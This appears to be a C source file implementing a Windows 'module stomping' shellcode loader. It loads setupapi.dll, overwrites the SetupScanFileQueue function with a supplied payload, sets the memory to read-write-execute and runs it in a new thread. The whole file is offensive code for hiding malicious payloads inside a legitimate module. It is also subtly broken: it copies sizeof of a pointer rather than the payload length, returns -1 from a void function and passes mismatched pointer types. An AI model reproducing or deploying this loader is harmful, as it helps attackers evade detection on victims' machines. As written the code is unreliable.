#include <stdio.h>
#include <Windows.h>


#define		SACRIFICIAL_DLL			"setupapi.dll"
#define		SACRIFICIAL_FUNC		"SetupScanFileQueue"

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	DWORD	dwOldProtection = NULL;

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

void moduleStomper(unsigned char** payload, DWORD size) {
	PVOID		pAddress = NULL;
	HMODULE		hModule = NULL;
	HANDLE		hThread = NULL;


	printf("[#] Press <Enter> To Load \"%s\" ... ", SACRIFICIAL_DLL);
	getchar();

	printf("[i] Loading ... ");
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE \n");



	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}


	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(pAddress, payload, sizeof(payload))) {
		return -1;
	}
	printf("[+] DONE \n");



	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
}